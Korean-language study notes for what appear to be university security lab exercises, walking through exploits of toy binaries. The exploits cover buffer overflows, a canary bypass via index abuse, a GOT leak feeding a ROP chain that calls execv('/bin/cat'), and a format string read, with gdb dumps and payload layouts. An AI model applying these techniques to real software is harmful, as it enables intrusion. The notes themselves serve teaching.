
# Lab #1

## 1-2 `list.c`
> Key Idea: Command Injection의 취약점
> '||', '&&', ';'...

## 1-3 `logger.c`
> Key Idea: Directory Traversal Attack
> "logs/../secret.txt"


# Lab #2

## 2-2 `echo2.c`
> Key Idea: scanf로 BOF를 통한 return address 수정

#### Observation

`disas echo`를 통해 `echo()`의 어셈블리 코드를 관찰하면 먼저 rsp+0x68 만큼의 Stack Section을 확보하고 시작하는 것을 알 수 있다.
그렇다는 뜻은 rsp+0x68의 위치에 return address가 있을 거라는 뜻이다.
```nasm
   0x000000000040122c <+0>:     sub    $0x68,%rsp
   0x0000000000401230 <+4>:     mov    $0x40204e,%edi
```

우리가 대체해야 할 return address의 주소는 `disas print_secret`를 통해 `0x4011a6`이라는 것을 알 수 있다.
```nasm
Dump of assembler code for function print_secret:
   0x00000000004011a6 <+0>:     push   %rbx
```

#### Attack

rsp+38에 접근하는 방법은 scanf의 취약점을 이용하여 BOF를 일으키는 것인데, scanf의 두번째에 전달하는 인자 rsi를 살펴보면 rsp+0x30을 전달하는 것을 알 수 있다.
```nasm
   0x000000000040126a <+62>:    lea    0x30(%rsp),%rsi
   0x000000000040126f <+67>:    mov    $0x402068,%edi
   0x0000000000401274 <+72>:    mov    $0x0,%eax
   0x0000000000401279 <+77>:    call   0x4010a0 <__isoc99_scanf@plt>
```

따라서 scanf에 `byte * 0x38(0x68-0x30) + return address`를 전달하면 BOF를 통해 rsp+0x68에 해당하는 공간의 값을 수정할 수 있다. (밑의 예에선 "BCDE" 전달)
```nasm
Input your second message:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE ("A" * 0x38 + "BCDE")

Breakpoint 1, 0x000000000040127e in echo ()
(gdb) x/14xg $rsp
0x7fffffffd6a0: 0x0000000000000a61      0x0000000000000000
0x7fffffffd6b0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6c0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6d0: 0x4141414141414141      0x4141414141414141
0x7fffffffd6e0: 0x4141414141414141      0x4141414141414141
0x7fffffffd6f0: 0x4141414141414141      0x4141414141414141
0x7fffffffd700: 0x4141414141414141      0x0000000045444342     # EDCB(Little Endian)
```

(!) Little Endian이므로 Return Address를 gdb로 출력되는 것과 반대로 전달해야함에 유의하자.
- `0x4011a6` -> `"\0xa6\0x11\0x40"`

결과적으로 ret 수행을 통해 `print_secret()`에 접근할 수 있게된다.

----------------------

## 2-3 `guess.c`
> Key Idea: scanf를 이용한 passcode 수정

#### Observation

이번 문제는 Canary가 적용되어있으므로 **2-2**처럼 `scanf()`와 같은 BOF 취약 함수를 통해 Stack Section을 넘어 return address 주소를 수정하는 것은 할 수 없다.
그렇다면 어떻게 접근해야할까?

코드를 보면 input에 *8자 이상의 passcode*를 전달하면 `print_secret()`에 접근할 수 있는 구조인 것을 알 수 있다.
```c
    if (strcmp(input, passcode) == 0) {
      print_secret();
    }
```

gdb를 통해 실제 passcode는 무엇인지 알아내보자.
`disas main()`을 수행 후 `load_passcode(passcode, PASSCODE_LEN)`의 첫 번째 인자를 관찰하면 passcode가 무엇인지 알 수 있으므로 `load_passcode`가 수행되고 난 뒤의 %rdi를 관찰해보자.
```nasm
   0x0000000000401419 <+85>:    mov    $0x10,%esi
   0x000000000040141e <+90>:    mov    %rax,%rdi
   0x0000000000401421 <+93>:    call   0x4012cb <load_passcode>
   0x0000000000401426 <+98>:    movb   $0x0,0x40(%rsp)
   0x000000000040142b <+103>:   movl   $0x1,0xc(%rsp)
   ...
Breakpoint 1, 0x0000000000401433 in main ()
(gdb) x/s $rdi
0x7ffff7fa4860 <unsafe_state>:  "PB\372\367\377\177"
```
다음과 같이 8글자 미만인 것을 알 수 있다.

따라서 다음과 같은 추론을 할 수 있다.
- (X) passcode 값을 알아내서 input에 집어넣는 것 만으론 `strlen()` if문에 걸릴것이다.
- (O) 그렇다면 차라리 `scanf`를 이용하여 passcode 자체의 값을 8글자 이상의 내가 알고있는 값으로 바꿔버리자. passcode는 지역 변수이므로 Stack Section 내에 있기 때문에 Canary에 걸리지 않는다.

#### Attack

그렇다면 input과 passcode의 상대적 위치를 알아내보자.
`main()`의 어셈블리 코드를 보면 input은 rsp+0x10위치에, passcode는 rsp+0x30 위치에 있는 것을 알 수 있다.
```nasm
   0x0000000000401414 <+80>:    lea    0x30(%rsp),%rax   # rsp+0x30
   0x0000000000401419 <+85>:    mov    $0x10,%esi
   0x000000000040141e <+90>:    mov    %rax,%rdi
   0x0000000000401421 <+93>:    call   0x4012cb <load_passcode>
   ...
   0x000000000040144d <+137>:   lea    0x10(%rsp),%rax   # rsp+0x10
   0x0000000000401452 <+142>:   mov    %rax,%rsi
   0x0000000000401455 <+145>:   mov    $0x4020ac,%edi
   0x000000000040145a <+150>:   mov    $0x0,%eax
   0x000000000040145f <+155>:   call   0x4010f0 <__isoc99_scanf@plt>
```

그렇다면 `scanf()`에 `byte * 0x20 + user define passcode + "\0x00"`를 전달하면 passcode를 수정할 수 있다.
String으로 인식해야하므로 뒤에 Null 문자`\0x00`을 집어넣는 것도 잊지 말자.

🔫 그렇다면 전체 Exploit 과정은 다음과 같다.
1. 첫 입력 시 passcode 수정
2. 두 번째 입력 시 수정한 passcode의 값 입력
```
(Trial 1) What is the passcode? : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHiImHacker
Wrong passcode!
(Trial 2) What is the passcode? : HiImHacker
Secret file content is: 20d33c6e
```

이렇게 하면 밑의 `main()`의 if문을 통과하면서 `print_secret()`를 수행할 수 있게된다.
```c
if (strcmp(input, passcode) == 0) {   // input = "HiImHacker", passcode = "HiImHacker"
    print_secret();                   // Executed!
}
```

#### Chat GPT

글자 "HiImHacker"를 전달하고 싶은데 Byte 변환을 하지 않고 String 그대로 전달하였더니 오류가 나 지피티에게 물어보았다.
다음과 같은 답변을 얻을 수 있었다.
![600](../../../../Z.%20Docs/img/Pasted%20image%2020241016035932.png)

----------------------

## 2-4 `fund.c`
> Key Idea: `item[]` 인덱스 접근을 이용한 return address 수정

#### Observation

어셈블리 코드를 살펴보기 전, 먼저 C 코드를 잘 살펴보자.
이 코드의 경우 **2-3**처럼 `print_secret()`을 출력해주는 조건문이 없으로 **2-1**처럼 return address를 수정하여 secret 함수에 접근하는 exploit 방법을 써야한다는 것을 알 수 있다.

Canary가 적용되어있기에, 그나마 가능성있는 접근법을 생각해보자면 `item[]`의 인덱스 접근을 이용하는 것이다.
그렇다면 `item[]`에 접근 중인 `renalance_portfolio()`에서 인덱스 변수에 적절한 값을 전달하여 return address를 고쳐야 한다는 뜻이다.

먼저 `disas rebalance_portfolio`를 통해 어셈블리 코드를 관찰해보자.
```nasm
Dump of assembler code for function rebalance_portfolio:
   0x00000000004013a3 <+0>:     push   %r12
   0x00000000004013a5 <+2>:     push   %rbp
   0x00000000004013a6 <+3>:     push   %rbx
   ...
   0x000000000040140d <+106>:   pop    %rbx
   0x000000000040140e <+107>:   pop    %rbp
   0x000000000040140f <+108>:   pop    %r12
```
여태까지 봐왔던 rsp인자를 왔다갔다 하는 구조가 아니다.

그렇다면 `rebalance_portfolio()`를 호출하는 `manage_fund`를 살펴보자.
```nasm
Dump of assembler code for function manage_fund:
   0x0000000000401423 <+0>:     sub    $0x58,%rsp
   ...
   0x0000000000401485 <+98>:    mov    %rsp,%rdi
   0x0000000000401488 <+101>:   call   0x4013a3 <rebalance_portfolio>
   ...
   0x000000000040149f <+124>:   add    $0x58,%rsp
   0x00000000004014a3 <+128>:   ret
```
여기를 보면 `rebalance_portfolio()`에 인자로 rsp를 전달하고 있는 것을 알 수 있다.

이 인자는 다음과 같이 `rebalance_portfolio()` 함수에서 %r12에 할당이 된다.
```nasm
Dump of assembler code for function rebalance_portfolio:
   ...
   0x00000000004013a7 <+4>:     mov    %rdi,%r12
```

그럼 이 %r12는 무엇을 위한 레지스터일까?
```nasm
Dump of assembler code for function rebalance_portfolio:
   ...
   0x00000000004013ff <+92>:    movslq %ebp,%rbp
   0x0000000000401402 <+95>:    sub    %eax,(%r12,%rbp,4)
   0x0000000000401406 <+99>:    movslq %ebx,%rbx
   0x0000000000401409 <+102>:   add    %eax,(%r12,%rbx,4)
```
이 부분을 보면 %r12가 바로 `item[]`에 해당하는 레지스터인 것을 알 수 있다.

예상을 해보면, rsp+0x58에 해당하는 장소에 return address가 있을 것이고, 이 공간은 rsp+88(22 $\times$ 4), 즉 `item[22]`에 해당하는 장소인 것을 추론해볼 수 있을 것이다.

우리가 대체해야 할 return address의 주소는 `disas print_secret`를 통해 `0x4011d6`이라는 것을 알 수 있다.
```nasm
Dump of assembler code for function print_secret:
   0x00000000004011d6 <+0>:     push   %rbx
```

#### Attack

그럼 뭘 어떻게 해서 return address를 바꿔야할까?
코드를 보면 `item[]`에 직접 data를 write하는 부분은 없다.
`int`의 '+'혹은 '-'만 가능할 뿐이다.

그렇다는 뜻은 우리는 기존 return address에서 적절히 값을 더하거나 빼서 원하는 주소 `0x4011d6`으로 바꿔줘야한다는 뜻이다.

기존 주소를 알아보기 위해 다음 명령어를 gdb에서 실행한다.
함수 시작 시 `push * 2 + 0x58`까지 읽어야하므로 16xg가 적절할 것이다.
(!) Little Endian에 주의하며 인덱스를 읽어나가보자.
```nasm
(gdb) x/2xg $r12
		item[1]    item[0]      item[3]    item[2]
0x7fffffffd6b0: 0x000186040001877b      0x0001862a00018704    # item[]의 시작

(gdb) x/16xg $rsp #실제로는 push 두 번 만큼의 주소가 더 올라가 있다.
0x7fffffffd690: 0x0000000000000000      0x0000000000000001
0x7fffffffd6a0: 0x00007fffffffd828      0x000000000040148d

	#	item[1]    item[0]      item[3]    item[2]
0x7fffffffd6b0: 0x000186040001877b      0x0001862a00018704
	#	item[5]    item[4]      item[7]    item[6]
0x7fffffffd6c0: 0x0001864a00018603      0x000186a900018729
	#	item[9]    item[8]      item[11]  item[10]
0x7fffffffd6d0: 0x000186a700018774      0x0001868f0001868e
	#	item[13]  item[12]      item[15]  item[14]
0x7fffffffd6e0: 0x000186b8000186ef      0x000185a6000185f1
	#	item[17]  item[16]      item[19]  item[18]
0x7fffffffd6f0: 0x0000000000000000      0x6d9532384a039a00
	#	item[21]  item[20]      item[23]  item[22]
0x7fffffffd700: 0x0000000000000001      0x00000000004014fa  # return address!
```

이제 실제 return address의 값을 알았다.
실제 return address와 내가 바꾸고 싶은 address의 차이를 온라인 hex calculator로 계산하였다.
![200](../../../../Z.%20Docs/img/Pasted%20image%2020241016043438.png)

그럼 return address를 수정했다고 하자. 이게 끝이 아니다.
`manage_fund()`함수를 빠져나오며 ret를 통해 return address가 수행되도록 해야한다.

🔫 그렇다면 전체 Exploit 과정은 다음과 같을 것이다.
1. menu 2로 진입
2. 인덱스 22에 해당하는 값을 804만큼 감소시킨다.
3. menu 3으로 `manage_fund()` 함수에서 exit
```
=== Manage your fund portfolio ===
1. Check your portfolio
2. Rebalance the portfolio
3. Retire from the market
(Enter 1~3): 2
Input the ID of item you want to withdraw money from: 22
Input the ID of item you want to invest more money: 2
Decide how much to move: 804        // return address changed.
=== Manage your fund portfolio ===
1. Check your portfolio
2. Rebalance the portfolio
3. Retire from the market
(Enter 1~3): 3                      // ret
Secret file content is: 272cd04e    // print_secret() Executed!
```

그럼 위와 같이 `print_secret()`를 수행할 수 있게된다.

## 2-5
> `read_memo()` i의 값이 음수인지 체크를 하지 않는 점을 이용해서 Canary 값의 Memory Disclosure를 일으킨다.

N-0x18: canary
N-0x8: return addr
N: rsp
N+0x20: `marr[]`
N+0x138: canary
N+0x148: return addr

Canary 값을 읽어서 memory id(2byte), modify_cnt(2byte), buf(4byte)를 통해 출력해낸다. (idx = -2)
이제 이걸 가지고 `modify_memo()`에서 BOF를 할 때 canary 값을 쓰고 들키지 않고 넘어간다.

# Lab #3

## 3-1 ``

## 3-2
> Out Range Index 접근을 통한 Memory Disclosure + ROP를 이용한 Expoit

우선 우리가 `substr.bin`에서 얻을 수 있는 ROP Gadget은 다음과 같다.
```
rdi_gadget = 0x401333 // %rdi
rsi_gadget = 0x401331 // %rsi, %r15
```

코드를 보면 다음과 같이 `read()`가 두 번 쓰이는데, 한 번은 Global Variable에 값을 저장하고 한 번은 Stack 영역에 값을 저장한다.
따라서 `3-1`에서 했던 것처럼 첫 번째 `read()`에서 Global Variable에 `execv()`에 전달할 인자들을 세팅해준 다음, 두 번째 `read()`에서 ROP Gadget을 사용하여 `execv(argv[0], argv)`를 실행시켜 secret.txt를 출력해낸다.
```c
	printf("[*] Input a string that you want to slice: ");
    read(0, gbuf, 128); // argv setting in gbuf
    printf("[*] Input the start and end indexes to extract with: ");
    read(0, buf, 128);  // execv(argv[0], argvv)
```

`argv[0], argv[1], argv[2]`의 내용은 다음과 같이 `3-1`과 같으나,
Argument Pointer `argv`를 전달해주는 과정에서 시행착오를 조금 겪었다. `후술`
```c
argv[0] = "/bin/cat";
argv[1] = filepath;
argv[2] = NULL;
```

그럼 이제 `execv()`의 주소를 알아야 되는데, ASLR의 정책에 의하여 이에 해당하는 GOT Entry는 Program이 시작 된 후에 할당되기 때문에 우리는 이를 Program이 시작 된 후에 GOT의 Memory Disclosure를 통해서 알아내야 한다.

기준이 될 GOT는 `write`에 해당하는 GOT로 하겠다.
gdb로 우리가 Disclosure할 Memory 주소를 알아내면 다음과 같이 `0x404020`에 해당하는 주소를 Process가 시작되고 나서 읽어오면 된다.
```nasm
(gdb) disas main
...
0x00000000004011f7 <+113>:   call   0x401040 <write@plt>
...
(gdb) x/i 0x401040
   0x401040 <write@plt>:        jmp    *0x2fda(%rip)        # 0x404020 <write@got.plt>
```

읽어오는 것은 gbuf의 Range를 벗어난 Index 접근을 통하여 가능하다.
다음과 같이 `char gbuf`의 주소는 `0x4040e0`이다.
```nasm
(gdb) x/s 0x4040e0
0x4040e0 <gbuf>:      ""
```

즉, `0x4040e0 - 0x404020 = 192(Decimal)`이므로 `gbuf[-192]`에서 8byte만큼(주솟값 크기) 값을 읽어들이면 `write()` 함수의 GOT Entry, 즉 실제 주소를 알 수 있다.
이는 첫번째 Iterantion에서 write에 다음과 같이 값을 전달하면 할 수 있다.
```c
...
	write(1, gbuf -192, (-184 - (-192)));
...
```

이렇게 해서 stdout에 추출해낸 값을 Little Endian을 고려하여 순서를 뒤집어주고 `libc.symbols`로 얻어낸 write와 execv의 offset 값을 다음과 같이 계산하면 `execv()`의 주소를 얻을 수 있다.
```python
execv_addr = hex(int(write_addr_b, 16) - write_offset + execv_offset)
```

이제 Second Loop에서 첫번째 `gbuf`에 값을 저장하는 첫 번째 `read()` 함수에서 `execv()`의 인자로 전달할 인자를 다음과 같이 구성한다.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115115440.png)
다음의 PintOS 과제 pdf를 참고하여 Argument를 쌓았다. `argv 포인터 마지막에 NULL을 넣어주지 않아서 계속 오류가 났었다..`
이제 `gbuf`의 시작 주소가 `argv`, 즉 Argument Pointer의 시작 주소가 된다.
![450](../../../../Z.%20Docs/img/Pasted%20image%2020241115115603.png)

이제 `execv()` 함수의 주솟값과 전달할 인자도 모두 준비되었으니 남은 것은 ROF를 통한 Expoit만 남았다.
main의 어셈블리를 살펴보면, 두 번째 `read()`에 전달하는 Stack 인자 `buf`의 시작 주소는 `%rsp+10`이고, return address가 저장된, Gadget으로 덮어쓰기 시작해야 하는 주소가 `%rsp+0x58`이라는 것을 알 수 있다.
```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401186 <+0>:     sub    $0x58,%rsp
   ...
   0x0000000000401265 <+223>:   lea    0x10(%rsp),%rsi
   0x000000000040126a <+228>:   mov    $0x0,%edi
   0x000000000040126f <+233>:   call   0x401070 <read@plt>
```

따라서 `buf`에 전달할 내용을 다음과 같이 구성한다.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115115506.png)
- `"A" * 0x48`: 함수의 return address에 도달하기 위한 BOF
- `0x401333`: `%rdi`에 값을 저장하기 위한 rdi Gadget
- `0x404100`: `argv[0] (/bin/cat)`, `%rdi`에 전달 할 값
- `0x401331`: `%rsi`에 값을 저장하기 위한 rsi Gadget
- `0x4040e0`: `argv`, `%rsi`에 전달 할 값
- `0x0`: `%r15`는 쓰이지 않으므로 Dump 값 전달
- `0x7ffb324351c0`: 앞서 Memory Disclosure를 통해 알아낸 `execv()` 주소

이를 전달하고 나면, 우리는 ROP를 통하여 `execv(argv[0], argv)`를 실행 시켜 `secret.txt`의 값을 출력할 수 있다.

## 3-3
> Format String Bug를 통한 Data값 읽어오기

우선 `printf()`가 실행 되기 직전의 main stack을 파악하기 위해 어셈블리를 살펴보면,
다음과 같이 return address는 `%rsp+0x40`에, `printf(`에 전달할 `buf[]`는 `%rsp+0x10`에 있는 것을 알 수 있다.
```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401176 <+0>:     push   %rbx
   0x0000000000401177 <+1>:     sub    $0x40,%rsp
   ...
   0x00000000004011f9 <+131>:   lea    0x10(%rsp),%rdi
   0x00000000004011fe <+136>:   mov    $0x0,%eax
   0x0000000000401203 <+141>:   call   0x401050 <printf@plt>
```

따라서 printf()가 실행돼서 `main()` stack에 새로운 `printf()` Stack이 추가되면
다음과 같은 Argment Layout을 예상할 수 있다. `(Stack 상자 밑, Stack 속 내용은 일단 무시)`
참고로 각 arg는 8byte이다.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115131123.png)

우리는 6번째 `%x` 부터 arg7에 접근할 수 있다.
따라서 총 2byte 길이인 `%x`의 개수를 잘 조절하며 buf에 `%x`와 secret의 내용을 char 형식으로 출력 할 `%s`, 그리고 secret.txt가 저장되어있는 전역 변수 `secret`의 주소 `0x404070`를 전달하여 secret.txt를 출력하면 된다.

결과적으로 buf에 다음과 같이 Format String을 전달한다.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115131123.png)
- `%x%x%x%x%x` (5개): `printf()` 함수 내의 arg를 가리킨다. 따라서 자세히 고려할 필요는 없다.
- 6번째 `%x`: arg7, 즉 N을 가리킨다.
- 7번째 `%x`: arg8, 즉 N+0x8을 가리킨다.
- 8번째 `%x`: arg9, 즉 N+0x10을 가리킨다.
- 9번째 `%x`: arg10, 즉 N+0x18을 가리킨다.
- 10번째 `%x`: arg11, 즉 N+0x20을 가리킨다.
이제 다음 arg12를 가리키기 전까지 총 4byte의 입력 공간이 남았다.
- ` \n` (2byte): 줄바꿈을 입력하여 `recvline()`으로 secret.txt를 읽을 수 있도록 한다.
- `%s`: arg12, 즉 N+0x28을 가리킨다. String으로 출력하기 위해 %s를 지정해주었다.
마지막으로 N+0x28에 다음 gdb로 확인한 전역 변수 `secret`을 가리키는 주소를 집어넣는다.
```nasm
Breakpoint 2, 0x00000000004011fe in main ()
(gdb) x/s 0x404070
0x404070 <secret>:      "1b19361b\n"
```
- `0x404070`: arg12

이제 secret.txt가 출력되는 것을 확인할 수 있을 것이다.

## 3-4

## 3-5
`wirte@plt(1, &write_got, 0x0x80)
`read@plt(0, &msg[], 0x00)
`execv()`

첫번째 ROP Table
```
| AAAA | %rdi_gadget | 1 | %rsi_gadget | ... | write@plt | main() |
// main을 호출해서 main의 처음으로 돌아간다.
```

결론적으로 3-2의 확장형이긴 한데, 보조함수도 없고.. 코드 길이도 짧고..

# 실습 시험

CSPRO 사용
